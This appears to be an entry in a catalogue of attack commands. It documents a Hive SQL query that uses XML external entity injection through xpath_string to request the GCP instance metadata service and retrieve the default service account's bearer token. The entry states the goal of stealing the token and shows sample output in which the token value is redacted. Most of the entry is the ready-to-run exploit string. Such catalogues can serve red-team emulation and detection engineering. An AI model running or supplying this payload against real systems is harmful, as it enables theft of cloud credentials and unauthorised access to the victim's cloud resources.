---
id: uuid-c6
data: >-
  select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [
  <!ENTITY xxe SYSTEM
  "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token">
  ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
tags:
  - xxe
  - token
type: command
output: '{ "access_token": "[redacted]", "expires_in": 2765, "token_type": "Bearer" }'
executor: sql
platforms:
  - GCP
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.601Z'
verified: false
validated: true
submitted: true
---
# hive-xxe-fetch-token

## Command

```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

## Description

Injects XXE to steal the default service account bearer token via metadata SSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| SYSTEM | Token endpoint | Yes |
| LIMIT 5 | Result limit | Yes |

## Examples

### Basic Usage

```sql
select xpath_string(...) FROM test LIMIT 5;
```

## Expected Output

JSON token object.

## Related

- [[Related Procedure: Retrieve-Service-Account-Bearer-Token-via-XXE]]
